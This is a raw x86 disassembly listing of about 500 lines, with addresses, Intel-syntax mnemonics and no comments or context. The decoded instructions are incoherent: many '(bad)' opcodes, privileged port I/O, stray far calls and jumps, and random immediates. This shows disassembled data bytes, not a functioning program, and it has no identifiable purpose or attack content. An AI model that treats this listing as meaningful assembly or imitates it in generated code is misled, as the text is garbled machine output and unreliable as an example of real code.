  421e1a:	jge    0x421e89
  421e1c:	mov    ds:0xaf732aa8,eax
  421e21:	and    DWORD PTR [esi+0x343e359f],esp
  421e27:	mov    ebx,0x497212f7
  421e2c:	lahf   
  421e2d:	mov    ebx,0xeb822570
  421e32:	data16 and BYTE PTR [edi*8+0x36cfa092],dl
  421e3a:	inc    ebx
  421e3b:	ret    0xff03
  421e3e:	push   cs
  421e3f:	mov    ebx,edi
  421e41:	ret    
  421e42:	inc    ebx
  421e43:	outs   dx,BYTE PTR ds:[esi]
  421e44:	pop    ecx
  421e45:	and    dh,0x9f
  421e48:	jg     0x421e1b
  421e4a:	out    0x1a,eax
  421e4c:	sbb    edi,ecx
  421e4e:	mov    ds:0x17650fba,eax
  421e53:	dec    ebp
  421e54:	sbb    edi,DWORD PTR [edi]
  421e56:	push   edx
  421e57:	inc    edi
  421e58:	jg     0x421e25
  421e5a:	aam    0x8e
  421e5c:	iret   
  421e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e5e:	push   ss
  421e5f:	jo     0x421ec8
  421e61:	or     DWORD PTR ds:0xaa492199,edx
  421e67:	pop    edi
  421e68:	push   ecx
  421e69:	or     DWORD PTR [ebx+0x42e3c41f],0xd07c8d71
  421e73:	daa    
  421e74:	call   0x9334:0xce08f661
  421e7b:	cs (bad) 
  421e7d:	and    eax,0x770b2a62
  421e82:	xor    eax,0x358ed94e
  421e87:	or     DWORD PTR ds:0xcde6cb95,edi
  421e8d:	cmp    DWORD PTR [esi-0x654e692f],edx
  421e93:	mov    dh,0xda
  421e95:	fcmovnbe st,st(0)
  421e97:	push   esp
  421e98:	arpl   WORD PTR [esi+0x711acda3],sp
  421e9e:	dec    edi
  421e9f:	js     0x421e85
  421ea1:	or     DWORD PTR [edi-0x2b82e965],ecx
  421ea7:	or     eax,0x58bccc1c
  421eac:	xchg   esi,eax
  421ead:	pop    es
  421eae:	or     al,0x72
  421eb0:	paddusw xmm1,XMMWORD PTR [edi+0x2911e9b7]
  421eb8:	xor    ecx,ecx
  421eba:	xor    ch,BYTE PTR [eax]
  421ebc:	test   BYTE PTR [edx-0x2eb849ce],bl
  421ec2:	mov    edi,0x8b503874
  421ec7:	push   ebp
  421ec8:	push   ebx
  421ec9:	sub    ebp,DWORD PTR [eax-0x21f066bf]
  421ecf:	ret    
  421ed0:	xchg   ebx,eax
  421ed1:	mov    dl,0xbb
  421ed3:	cmp    al,0xed
  421ed5:	popa   
  421ed6:	sub    eax,0x80243366
  421edb:	stos   BYTE PTR es:[edi],al
  421edc:	imul   ecx,DWORD PTR [edi+0xec99d8a],0xffffffd1
  421ee3:	jo     0x421e6e
  421ee5:	fcomp  QWORD PTR [edx+0x58]
  421ee8:	sar    BYTE PTR [ecx],cl
  421eea:	cmp    cl,dl
  421eec:	stc    
  421eed:	retf   
  421eee:	imul   ebp,DWORD PTR [edi+0x7e],0x47c30437
  421ef5:	push   es
  421ef6:	jg     0x421eea
  421ef8:	js     0x421eb5
  421efa:	outs   dx,BYTE PTR ds:[esi]
  421efb:	or     cl,cl
  421efd:	sbb    eax,DWORD PTR [ebp+0x7f300406]
  421f03:	ins    BYTE PTR es:[edi],dx
  421f04:	into   
  421f05:	loopne 0x421f7d
  421f07:	cld    
  421f08:	cdq    
  421f09:	pop    edx
  421f0a:	inc    esi
  421f0b:	pop    ebx
  421f0c:	add    DWORD PTR [edx+0x6],edi
  421f0f:	xor    bl,ch
  421f11:	ds pop eax
  421f13:	ins    BYTE PTR es:[edi],dx
  421f14:	jge    0x421f39
  421f16:	dec    edx
  421f17:	add    BYTE PTR [ebx+0x7],dl
  421f1a:	mov    ds:0xb6e4b802,al
  421f1f:	lods   eax,DWORD PTR ds:[esi]
  421f20:	cmp    al,0xcf
  421f22:	inc    ecx
  421f23:	icebp  
  421f24:	mov    esi,0x74c3acd1
  421f29:	inc    ebp
  421f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f2b:	nop
  421f2c:	test   al,0xa7
  421f2e:	(bad)  
  421f2f:	mov    bh,0x3c
  421f31:	imul   ebp,DWORD PTR [edx+ecx*1+0x41],0xffffffdb
  421f36:	out    0x8a,al
  421f38:	shr    DWORD PTR [edi+0x6d2ca043],0x78
  421f3f:	rol    BYTE PTR [esi+0x3d],1
  421f42:	(bad)  
  421f43:	cmp    BYTE PTR [eax+0x72],ch
  421f46:	mov    dh,0x8c
  421f48:	jb     0x421f6e
  421f4a:	push   eax
  421f4b:	jnp    0x421f62
  421f4d:	cmp    eax,0xa5902a8b
  421f52:	out    0x62,al
  421f54:	or     ebx,esi
  421f56:	xor    dl,0x97
  421f59:	cs xor eax,0x29c246ec
  421f5f:	dec    BYTE PTR [eax]
  421f61:	ds pop ebx
  421f63:	dec    ebx
  421f64:	mov    cl,0x29
  421f66:	mov    BYTE PTR [ebx-0x60],dh
  421f69:	pop    eax
  421f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f6b:	(bad)  
  421f6d:	ror    BYTE PTR [ecx+0x12],0x7
  421f71:	hlt    
  421f72:	arpl   WORD PTR [ebx-0x37f04079],dx
  421f78:	xchg   edx,eax
  421f79:	popa   
  421f7a:	adc    BYTE PTR [esi],ah
  421f7c:	repz adc BYTE PTR [ebx+0x7a495dda],0x35
  421f84:	xchg   edx,eax
  421f85:	cdq    
  421f86:	or     BYTE PTR [edi-0x53],dl
  421f89:	cdq    
  421f8a:	push   esi
  421f8b:	cmc    
  421f8c:	imul   esi,DWORD PTR [ecx+edi*4+0x74],0xcd51753d
  421f94:	in     eax,dx
  421f95:	dec    esp
  421f96:	sbb    dh,BYTE PTR [ecx]
  421f98:	mov    ebx,edi
  421f9a:	xchg   esi,eax
  421f9b:	bound  ecx,QWORD PTR [edx+0x156697b4]
  421fa1:	mov    edx,0x43d529b9
  421fa6:	add    ebp,esi
  421fa8:	cmp    DWORD PTR [ebx+ebx*2-0x4d404499],ebx
  421faf:	mov    BYTE PTR [edx],cl
  421fb1:	adc    eax,0xf57808c1
  421fb6:	jns    0x422034
  421fb8:	jmp    0x421fcf
  421fba:	push   0x8cd9e29f
  421fbf:	nop
  421fc0:	sbb    BYTE PTR [esi+0x65],bh
  421fc3:	mov    es,WORD PTR [eax+0x5e8a10f]
  421fc9:	pushfw 
  421fcb:	js     0x422033
  421fcd:	jbe    0x421f98
  421fcf:	ror    DWORD PTR [eax],1
  421fd1:	push   ecx
  421fd2:	push   0x5d15f551
  421fd7:	aas    
  421fd8:	and    ebp,ebp
  421fda:	retf   
  421fdb:	inc    ebp
  421fdc:	and    ebx,DWORD PTR [eax+edx*8]
  421fdf:	stos   BYTE PTR es:[edi],al
  421fe0:	or     eax,0xbeaf2fdd
  421fe5:	jg     0x422008
  421fe7:	mov    al,ds:0x1c3bca0a
  421fec:	out    0x18,al
  421fee:	daa    
  421fef:	es push 0x87480406
  421ff5:	cwde   
  421ff6:	mov    ecx,0xb4192d54
  421ffb:	adc    ch,cl
  421ffd:	mov    edi,0x3d3a26ff
  422002:	aam    0x47
  422004:	jg     0x421fb6
  422006:	dec    ebx
  422007:	sub    eax,0x71a7050c
  42200c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42200d:	enter  0xff63,0x39
  422011:	sti    
  422012:	ror    BYTE PTR [edi-0x75],1
  422015:	xor    ah,BYTE PTR [edx+ebx*1-0x30]
  422019:	adc    ecx,ecx
  42201b:	mov    al,BYTE PTR [edi+eiz*2+0x57]
  42201f:	xor    BYTE PTR [ebx-0x26],dl
  422022:	lock out dx,al
  422024:	cwde   
  422025:	mov    al,ds:0x1f6c4d27
  42202a:	adc    BYTE PTR [ebp-0x43ef869a],dl
  422030:	and    BYTE PTR [ebx+0x56c6f96f],cl
  422036:	sbb    cl,BYTE PTR [edx+edi*8]
  422039:	add    BYTE PTR [esi+0x11],dh
  42203c:	and    eax,0xa5675baa
  422041:	into   
  422042:	inc    ecx
  422043:	ror    DWORD PTR ds:0xbbd989f5,0xa9
  42204a:	or     esp,DWORD PTR [ecx+0x4298cc00]
  422050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422051:	add    BYTE PTR [ebp-0x19],0x1f
  422055:	(bad)  
  422057:	pop    ebx
  422058:	loope  0x42205b
  42205a:	cmc    
  42205b:	je     0x42207f
  42205d:	push   cs
  42205e:	(bad)  
  42205f:	imul   eax,DWORD PTR [edi+0x1a],0xad9b8090
  422066:	and    DWORD PTR [edx],0xffffffcf
  422069:	clc    
  42206a:	push   DWORD PTR [edi-0x2e]
  42206d:	sub    edi,DWORD PTR [eax+0x560d2b5d]
  422073:	mov    bl,0x0
  422075:	mov    al,ds:0x2408a347
  42207a:	inc    ebx
  42207b:	not    BYTE PTR [ebp-0x73]
  42207e:	lods   eax,DWORD PTR ds:[esi]
  42207f:	fld    st(0)
  422081:	out    0xa2,al
  422083:	leave  
  422084:	inc    edi
  422085:	imul   eax,DWORD PTR [edi],0xfffffffc
  422088:	js     0x4220de
  42208a:	cmp    eax,0xc4c42fe9
  42208f:	fcomp  QWORD PTR [eax+eax*1-0x5df47779]
  422096:	adc    cl,BYTE PTR [esi+eax*8-0x602f2668]
  42209d:	leave  
  42209e:	test   DWORD PTR [edx+0x57],0x81c066c4
  4220a5:	(bad)  
  4220a6:	mov    eax,0x3fdee1c6
  4220ab:	int3   
  4220ac:	outs   dx,BYTE PTR ds:[esi]
  4220ad:	popf   
  4220ae:	push   0xaca7976b
  4220b3:	mov    ds:0xe32e16d8,eax
  4220b8:	je     0x422138
  4220ba:	rcl    ecx,1
  4220bc:	(bad)  
  4220bd:	js     0x422111
  4220bf:	inc    ebx
  4220c0:	mov    eax,ds:0x7816fb38
  4220c5:	sub    eax,0x6372ce3
  4220ca:	fimul  WORD PTR [edi+0x32]
  4220cd:	(bad)  
  4220ce:	fstp   DWORD PTR [eax]
  4220d0:	sahf   
  4220d1:	(bad)  
  4220d2:	ins    DWORD PTR es:[edi],dx
  4220d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d4:	popa   
  4220d5:	retf   0xa3d1
  4220d8:	mov    cl,BYTE PTR [eax]
  4220da:	pop    esp
  4220db:	xor    al,0x96
  4220dd:	jns    0x42206d
  4220df:	mov    ds,WORD PTR [ecx]
  4220e1:	jle    0x422129
  4220e3:	imul   ebp,DWORD PTR [ecx-0x2c],0x1f
  4220e7:	fistp  QWORD PTR [ebx-0x35]
  4220ea:	dec    ecx
  4220eb:	aaa    
  4220ec:	mov    dl,0x4e
  4220ee:	jecxz  0x422103
  4220f0:	mov    edi,0xbeda6a3f
  4220f5:	fstp   QWORD PTR gs:0x8e5ae042
  4220fc:	pop    esp
  4220fd:	scas   al,BYTE PTR es:[edi]
  4220fe:	fsubr  st(1),st
  422100:	cmc    
  422101:	in     eax,0x21
  422103:	in     al,0x66
  422105:	mov    esi,0xf4782e06
  42210a:	je     0x422141
  42210c:	in     al,dx
  42210d:	das    
  42210e:	mov    bl,0x23
  422110:	int    0xa9
  422112:	cmp    eax,0x59211eb8
  422117:	mov    ah,0x29
  422119:	inc    eax
  42211a:	push   esp
  42211b:	lea    ecx,[edx]
  42211d:	(bad)  
  42211e:	xchg   ebx,eax
  42211f:	pop    esi
  422120:	stc    
  422121:	test   eax,0x8f345a77
  422126:	mov    ds:0xadfcc008,eax
  42212b:	mov    ecx,cs
  42212d:	sti    
  42212e:	retf   
  42212f:	cli    
  422130:	cmp    esi,esi
  422132:	jae    0x422146
  422134:	fist   DWORD PTR [edi+0x3e]
  422137:	add    eax,0x33ae08ad
  42213c:	imul   edi,DWORD PTR [ecx+eiz*2-0x20],0x599f1f1b
  422144:	pop    es
  422145:	sub    al,0xb4
  422147:	leave  
  422148:	or     eax,0xc1013d85
  42214d:	in     al,dx
  42214e:	in     eax,0x8
  422150:	dec    ebx
  422151:	fisubr WORD PTR [ecx+0x25]
  422154:	mov    ebx,0x4a3e1d6f
  422159:	jp     0x422126
  42215b:	scas   eax,DWORD PTR es:[edi]
  42215c:	jns    0x42215a
  42215e:	je     0x422110
  422160:	cmp    al,0xe5
  422162:	mov    ds:0x2f439a98,al
  422167:	push   es
  422168:	shl    DWORD PTR [edi-0x5ccec6f9],0xcc
  42216f:	dec    edx
  422170:	jle    0x4221a5
  422172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422173:	mov    bh,BYTE PTR [esi+ebx*2+0x26]
  422177:	imul   esp,DWORD PTR [edi],0xffffffba
  42217a:	call   0xd4ef:0x298a890f
  422181:	mov    BYTE PTR [ebp-0x1212bfad],dh
  422187:	addr16 push ebp
  422189:	inc    ecx
  42218a:	popfw  
  42218c:	add    DWORD PTR [ecx+eiz*8+0x15],ebx
  422190:	arpl   WORD PTR [ecx+edx*8],si
  422193:	xchg   BYTE PTR [eax+0x4b],ch
  422196:	dec    eax
  422198:	xor    al,0xc7
  42219a:	aam    0x3c
  42219c:	pop    ss
  42219d:	in     al,dx
  42219e:	add    al,0xda
  4221a0:	xor    edi,ebp
  4221a2:	(bad)  
  4221a3:	cmp    esi,DWORD PTR [ecx]
  4221a5:	test   al,ch
  4221a7:	stos   DWORD PTR es:[edi],eax
  4221a8:	xchg   esi,eax
  4221a9:	cmp    DWORD PTR [ebp-0x6945ed37],ecx
  4221af:	out    0xc8,eax
  4221b1:	ffreep st(2)
  4221b3:	mov    eax,ds:0x3e169048
  4221b8:	dec    edi
  4221b9:	dec    BYTE PTR [ebp+0x4642aac8]
  4221bf:	push   ebx
  4221c0:	jmp    0x6fc1dfc1
  4221c5:	cmp    ebp,DWORD PTR [ecx+0x4d]
  4221c8:	jecxz  0x422200
  4221ca:	daa    
  4221cb:	in     al,dx
  4221cc:	push   edx
  4221cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221ce:	pop    ds
  4221cf:	sti    
  4221d0:	mov    ds:0x3e00b9f4,al
  4221d5:	adc    al,0x5e
  4221d7:	sbb    DWORD PTR ss:0x87508201,ebx
  4221de:	cwde   
  4221df:	inc    ebp
  4221e0:	pop    es
  4221e1:	cmc    
  4221e2:	add    eax,0xf6b27c3c
  4221e7:	sbb    BYTE PTR [edx+edx*8+0x3dcdf6cf],cl
  4221ee:	pop    ds
  4221ef:	es dec eax
  4221f1:	and    bh,BYTE PTR [ebx+ecx*4]
  4221f4:	pop    ss
  4221f5:	push   0x25211bde
  4221fa:	(bad)  
  4221fb:	shr    DWORD PTR [ebx],cl
  4221fd:	and    al,0x7c
  4221ff:	bound  edx,QWORD PTR [ebp-0x1d]
  422202:	call   0x18d7:0x6384e8e6
  422209:	stos   DWORD PTR es:[edi],eax
  42220a:	push   esi
  42220b:	xor    eax,esi
  42220d:	or     BYTE PTR [esp+esi*2+0x3738167d],cl
  422214:	pushf  
  422215:	adc    eax,0x427f4d6f
  42221a:	(bad)  
  42221b:	mov    esi,0x7f72fade
  422220:	sub    al,0x6a
  422222:	leave  
  422223:	movntq QWORD PTR [eax+0x73b926f6],mm1
  42222a:	mov    al,ds:0x830a5413
  42222f:	push   ebp
  422230:	xchg   esi,eax
  422231:	mov    ch,0x5f
  422233:	mov    dl,0xbb
  422235:	leave  
  422236:	cmp    al,0xf
  422238:	jnp    0x4221ee
  42223a:	or     DWORD PTR [edi-0x7e],esi
  42223d:	aad    0xb6
  42223f:	je     0x4222bd
  422241:	ret    0xd692
  422244:	inc    edi
  422245:	dec    eax
  422246:	lea    edx,[edi+0x4f8dc5d6]
  42224c:	call   DWORD PTR ss:[esi-0x77]
  422250:	icebp  
  422251:	leave  
  422252:	adc    dl,BYTE PTR [ecx]
  422254:	mov    eax,0x2a3a6b92
  422259:	pop    ebx
  42225a:	mov    dh,0xd8
  42225c:	pop    ebx
  42225d:	leave  
  42225e:	mov    ebp,edi
  422260:	cld    
  422261:	popf   
  422262:	push   edi
  422263:	lahf   
  422264:	iret   
  422265:	push   ebx
  422266:	inc    edi
  422267:	sub    BYTE PTR [eax+0x14e2f649],bh
  42226d:	je     0x4222c5
  42226f:	sbb    bl,BYTE PTR [ecx-0x59]
  422272:	jmp    0x5643:0x2dd73ce7
  422279:	scas   eax,DWORD PTR es:[edi]
  42227a:	mov    dh,0xf5
  42227c:	jo     0x422247
  42227e:	add    bl,BYTE PTR [ecx]
  422280:	adc    dl,0xf1
  422283:	(bad)  [edi+ebp*4+0x2d]
  422287:	add    DWORD PTR [eax-0x69c033a3],0xa3d0a899
  422291:	xchg   ebx,eax
  422292:	jg     0x422256
  422294:	push   eax
  422295:	mov    eax,ds:0x442247dd
  42229a:	outs   dx,DWORD PTR ds:[esi]
  42229b:	out    dx,al
  42229c:	push   ds
  42229d:	sub    BYTE PTR [eax+ecx*1-0x7771a880],dh
  4222a4:	rol    BYTE PTR [eax],cl
  4222a6:	dec    esi
  4222a7:	rol    eax,0xd3
  4222aa:	outs   dx,BYTE PTR ds:[esi]
  4222ab:	mov    eax,ds:0x6e6a8842
  4222b0:	shr    DWORD PTR [eax+0xc],cl
  4222b3:	dec    esp
  4222b4:	add    edi,0x3f
  4222b7:	sbb    DWORD PTR [ebp-0x4f],0xbe6ca211
  4222be:	push   ss
  4222bf:	adc    eax,0x4e31546f
  4222c4:	xor    ch,dl
  4222c6:	jge    0x42228f
  4222c8:	loop   0x4222b0
  4222ca:	adc    DWORD PTR [ebx+0x6e],esp
  4222cd:	loop   0x422348
  4222cf:	cmp    BYTE PTR [edx-0x4f567740],al
  4222d5:	enter  0xd177,0x43
  4222d9:	mov    esi,0xb529f180
  4222de:	in     al,0xc6
  4222e0:	not    esp
  4222e2:	lock nop
  4222e4:	test   al,0xeb
  4222e7:	and    al,al
  4222e9:	pop    ss
  4222ea:	repnz in eax,dx
  4222ec:	push   0x4c49045f
  4222f1:	jmp    0xef2ffe
  4222f6:	mov    ebx,0xcad30561
  4222fb:	cld    
  4222fc:	pusha  
  4222fd:	mov    cl,0x4
  4222ff:	stc    
  422300:	cmp    eax,0x363c3c90
  422305:	(bad)  
  422306:	pop    edi
  422307:	push   esi
  422308:	fwait
  422309:	xchg   esi,eax
  42230a:	pushf  
  42230b:	or     bh,BYTE PTR [edx-0x45075cab]
  422311:	jno    0x4222fb
  422313:	clc    
  422314:	add    al,0x59
  422316:	sbb    BYTE PTR [ecx+0x9],al
  422319:	and    bl,ch
  42231b:	mov    ebx,0xd2cd0478
  422320:	adc    edx,ebx
  422322:	xor    BYTE PTR [ebp+esi*8-0x543b0c],cl
  422329:	push   0xfffffff7
  42232b:	adc    al,0xd1
  42232d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42232e:	(bad)  
  42232f:	push   cs
  422330:	pop    edx
  422331:	mov    ebx,0x6ea4017e
  422336:	xor    BYTE PTR [ebx-0x32],ch
  422339:	cmp    ch,dh
  42233b:	lods   eax,DWORD PTR ds:[esi]
  42233c:	ffreep st(6)
  42233e:	xlat   BYTE PTR ds:[ebx]
  42233f:	or     DWORD PTR [ebp+eax*1-0x336f62ee],esp
  422346:	push   cs
  422347:	jl     0x4222da
  422349:	aaa    
  42234a:	or     esp,DWORD PTR [ebx-0x1a]
  42234d:	and    DWORD PTR [ebx+0xd],eax
  422350:	out    dx,eax
  422351:	bound  ebx,QWORD PTR [ecx+0x6a]
  422354:	xlat   BYTE PTR ds:[ebx]
  422355:	icebp  
  422356:	fs jg  0x4222f0
  422359:	pop    esi
  42235a:	repnz fstp QWORD PTR [edx-0x69]
  42235e:	inc    esp
  42235f:	inc    edi
  422360:	je     0x422397
  422362:	fs (bad) 
  422364:	loopne 0x42232d
  422366:	sar    DWORD PTR [esp+ecx*4+0x2a],1
  42236a:	cmp    ecx,DWORD PTR [edi]
  42236c:	sbb    eax,esp
  42236e:	sbb    dh,bh
  422370:	push   cs
  422371:	xchg   BYTE PTR [ebx],ah
  422373:	sub    eax,0x1f91c736
  422378:	aad    0x95
  42237a:	sub    BYTE PTR [esi-0x6f],cl
  42237d:	outs   dx,BYTE PTR ds:[esi]
  42237e:	add    bl,cl
  422380:	or     esp,DWORD PTR [eax-0xff53f0e]
  422386:	lea    edx,[esi-0x4d6dd024]
  42238c:	ss mov ch,0x81
  42238f:	or     eax,ebx
  422391:	mov    edx,0xb9a386a0
  422396:	jl     0x422362
  422398:	add    DWORD PTR [ecx-0x32],eax
  42239b:	mov    edx,DWORD PTR [ecx+ecx*4+0x42]
  42239f:	and    bh,BYTE PTR [edx-0x44]
  4223a2:	call   FWORD PTR [edi+0x30b5aa78]
  4223a8:	sub    eax,0xece34c9a
  4223ad:	mov    ch,0x89
  4223af:	jmp    0x19d6:0x377a48bf
  4223b6:	or     DWORD PTR [edi+0x6e5446a8],ebx
  4223bc:	mov    al,0xfb
  4223be:	sbb    DWORD PTR [ebx],esi
  4223c0:	jg     0x4223c2
  4223c2:	jmp    0x8178812e
  4223c7:	(bad)  
  4223c8:	jmp    0x42242d
  4223ca:	icebp  
  4223cb:	push   cs
  4223cc:	sti    
  4223cd:	lock mov ds:0x2e153c3b,eax
  4223d3:	push   0x39
  4223d5:	and    esi,ebx
  4223d7:	outs   dx,BYTE PTR ds:[esi]
  4223d8:	push   esp
  4223d9:	aaa    
  4223da:	cmp    DWORD PTR [ecx-0x38],ecx
  4223dd:	and    DWORD PTR [edi+0x7cf737dc],edx
  4223e3:	rcr    BYTE PTR [edi+0xac105],cl
  4223e9:	mov    ch,0x72
  4223eb:	sti    
  4223ec:	in     al,0xfd
  4223ee:	jbe    0x4223f0
  4223f0:	cmp    BYTE PTR [esi+0x14],bh
  4223f3:	jecxz  0x422443
  4223f5:	in     eax,0xf7
  4223f7:	mov    al,bh
  4223f9:	dec    esp
  4223fa:	jle    0x422470
  4223fc:	popf   
  4223fd:	adc    al,0xea
  4223ff:	ror    DWORD PTR [ebx-0x1afb68eb],0xfe
  422406:	cmp    al,BYTE PTR [edi]
  422408:	and    al,0xc8
  42240a:	push   ds
  42240b:	mov    eax,ds:0x22db8568
  422410:	popa   
  422411:	or     bh,BYTE PTR [esi+edi*1]
  422414:	xor    al,0xb8
  422416:	inc    edx
  422417:	rcl    BYTE PTR [eax],cl
  422419:	mov    eax,ds:0xe3d940db
  42241e:	pushf  
  42241f:	in     al,dx
  422420:	inc    esp
  422421:	clc    
  422422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422423:	mov    ebp,0xe058aba7
  422428:	pop    ebp
  422429:	pop    ecx
  42242a:	in     eax,dx
  42242b:	push   0xffffffd2
  42242d:	jno    0x4224ac
  42242f:	push   cs
  422430:	arpl   sp,bx
  422432:	pop    ss
  422433:	inc    eax
  422434:	(bad)  
  422436:	pop    esp
  422437:	sbb    DWORD PTR [edx-0x44025364],edi
  42243d:	dec    ecx
  42243e:	and    bl,BYTE PTR [edx+0x9a35f33]
  422444:	sbb    ch,cl
  422446:	cdq    
  422447:	pop    ebp
  422448:	mov    esi,?
  42244a:	xor    cl,BYTE PTR [edi+0xaea20fd]
  422450:	dec    eax
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	int3   
  422453:	or     DWORD PTR [esi-0xd4e0a66],esi
  422459:	mov    eax,ds:0x5de48acd
  42245e:	xchg   ecx,eax
  42245f:	inc    eax
  422460:	shl    DWORD PTR [edi-0x6a],1
  422463:	in     eax,dx
  422464:	in     al,0x84
  422466:	inc    eax
  422467:	or     DWORD PTR [esi+0x69],esp
  42246a:	jg     0x42241d
  42246c:	jmp    0xbd5ade9d
  422471:	jmp    0x42247b
  422473:	hlt    
  422474:	ins    DWORD PTR es:[edi],dx
  422475:	push   es
  422476:	dec    edx
  422477:	pop    ecx
  422478:	mov    ecx,0x5883e604
  42247d:	add    DWORD PTR [edx],0x73
  422480:	or     al,0x1c
  422482:	jno    0x422449
  422484:	sahf   
  422485:	movsx  ebx,BYTE PTR [eax+0x11]
  422489:	clc    
  42248a:	sub    BYTE PTR [eax],bl
  42248c:	call   0x381b:0x949fe80d
  422493:	sub    DWORD PTR [eax+edi*8],edi
  422496:	lea    edx,[ecx-0x6dc46b0d]
  42249c:	sub    al,0xfc
  42249e:	inc    eax
  42249f:	arpl   WORD PTR [ebp+0x40],bp
  4224a2:	mov    ds:0xedbf4960,al
  4224a7:	out    dx,eax
  4224a8:	rcr    DWORD PTR [eax+eiz*1-0xb],cl
  4224ac:	mov    edi,0x7558a54f
  4224b1:	jmp    0xafab:0x1cc0c8b5
  4224b8:	mov    BYTE PTR [edi+0x54368980],dl
  4224be:	xchg   esi,eax
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	jne    0x422463
  4224c2:	(bad)  
  4224c4:	cmp    bh,dh
  4224c6:	pop    ebp
  4224c7:	adc    bl,al
  4224c9:	sub    ebp,DWORD PTR [edx]
  4224cb:	adc    al,dl
  4224cd:	jmp    0x422500
  4224cf:	and    al,0x36
  4224d1:	mov    ah,0xae
  4224d3:	mov    bl,0xf2
  4224d5:	in     al,dx
  4224d6:	pop    eax
  4224d7:	pop    edx
  4224d8:	rol    ebx,1
  4224da:	adc    eax,DWORD PTR [ebx+edx*4]
  4224dd:	iret   
  4224de:	mov    dh,0xbb
  4224e0:	push   0x5b437e90
  4224e5:	mov    ecx,0x9700c1c
  4224ea:	stos   DWORD PTR es:[edi],eax
  4224eb:	xor    eax,0xb72ecd3
  4224f0:	pop    ecx
  4224f1:	jne    0x42252d
  4224f3:	mov    edi,0x74618f39
  4224f8:	les    esi,FWORD PTR [eax]
  4224fa:	mov    edi,0x165086a1
  4224ff:	push   ds
  422500:	scas   eax,DWORD PTR es:[edi]
  422501:	(bad)  
  422502:	adc    edi,ebx
  422504:	sti    
  422505:	push   cs
  422506:	pop    es
  422507:	mov    cl,0xae
  422509:	in     al,dx
  42250a:	jg     0x422545
  42250c:	popa   
  42250d:	sub    eax,0x9539e23e
  422512:	mov    ds:0x972f402,al
  422517:	cmp    ah,dh
  422519:	test   eax,0x8a4b15b3
  42251e:	dec    esi
  42251f:	in     al,dx
  422520:	xchg   ebp,eax
  422521:	sub    bh,dh
  422523:	jnp    0x4224bf
  422525:	mov    ecx,DWORD PTR ss:[ebx]
  422528:	xor    esi,DWORD PTR [edi+edi*2+0x50]
  42252c:	sar    BYTE PTR [ecx+ebx*2],1
  42252f:	(bad)  
  422530:	sti    
  422531:	fadd   QWORD PTR [ebp+0x51f20647]
  422537:	ret    0xa32d
  42253a:	outs   dx,BYTE PTR ds:[esi]
  42253b:	shl    BYTE PTR [edx+ebp*8-0x19],1
  42253f:	cmc    
  422540:	cmp    eax,0xeae759e1
  422545:	gs and BYTE PTR ss:[edx+0xc354ac1],dl
  42254d:	cli    
  42254e:	or     edi,ebp
  422550:	xor    al,0x2e
  422552:	hlt    
  422553:	xchg   esp,eax
  422554:	or     esi,DWORD PTR [ecx+edx*8-0x36]
  422558:	fidiv  WORD PTR [ebp+0x621bbc26]
  42255e:	or     cl,BYTE PTR [ebx+0x27730d16]
  422564:	mov    edi,0xc95d5bd2
  422569:	dec    ecx
  42256a:	in     eax,0x1e
  42256c:	jns    0x422504
  42256e:	cwde   
  42256f:	not    eax
  422571:	push   ecx
  422572:	xchg   al,ah
  422574:	sti    
  422575:	push   es
  422576:	out    dx,al
  422577:	xchg   edx,eax
  422578:	leave  
  422579:	xor    BYTE PTR [eax+0x35dc8c99],cl
  42257f:	rcl    BYTE PTR [eax+0x3e95a92c],cl
  422585:	xchg   esi,eax
  422586:	cmp    eax,0xc6ac19d2
  42258b:	xchg   edi,eax
  42258c:	xor    al,0x56
  42258e:	mov    dl,0x6d
  422590:	mov    edx,0xfef4fe63
  422595:	ja     0x4225f2
  422597:	mov    dl,0x30
  422599:	retf   
  42259a:	rcr    BYTE PTR [edx+0x17d554bc],1
  4225a0:	cmp    BYTE PTR [esp+ecx*4+0x7a],cl
  4225a4:	push   es
  4225a5:	scas   al,BYTE PTR es:[edi]
  4225a6:	inc    ecx
  4225a7:	inc    edx
  4225a8:	mov    bl,0x92
  4225aa:	imul   ebx,DWORD PTR [ebx+ebp*4-0x6],0xffffffae
  4225af:	pop    esp
  4225b0:	pop    ebx
  4225b1:	xchg   BYTE PTR [edi-0x279a2de4],bh
  4225b7:	add    DWORD PTR [ebp-0x53e8090b],0xffffff84
  4225be:	nop
  4225bf:	std    
  4225c0:	bound  esp,QWORD PTR [ebx-0x4e60491]
  4225c6:	(bad)  
  4225c7:	push   ss
  4225c8:	jmp    0x480faa10
  4225cd:	(bad)  
  4225cf:	scas   al,BYTE PTR es:[edi]
  4225d0:	lock ret 0xad7c
  4225d4:	sti    
  4225d5:	or     DWORD PTR [ebx-0x2b],ecx
  4225d8:	daa    
  4225d9:	push   0x58
  4225db:	loop   0x42262a
  4225dd:	inc    ecx
  4225de:	or     ah,bh
  4225e0:	cmp    dh,BYTE PTR [ebp-0x3d3ba6d0]
  4225e6:	jno    0x422642
  4225e8:	xchg   edi,eax
  4225e9:	es fwait
  4225eb:	rcr    BYTE PTR [edi+0x6f],1
  4225ee:	mov    esi,0x83aec6e
  4225f3:	xor    DWORD PTR [ecx+0x74],ecx
  4225f6:	push   ecx
  4225f8:	dec    eax
  4225f9:	stc    
  4225fa:	cs adc ch,bl
  4225fd:	jge    0x4225cd
  4225ff:	mov    eax,ds:0x983085fe
  422604:	and    eax,0x9f0b7da7
  422609:	loopne 0x4225ab
  42260b:	sbb    bl,dl
  42260d:	add    eax,0x89bf61ae
  422612:	jl     0x422671
  422614:	outs   dx,BYTE PTR ds:[esi]
  422615:	jmp    0xc85d:0xec022e2
  42261c:	hlt    
  42261d:	data16 loope 0x4225a3
  422620:	stc    
  422621:	sti    
  422622:	lahf   
  422623:	js     0x4225c2
  422625:	aad    0x74
  422627:	rcr    bh,1
  422629:	sar    ecx,cl
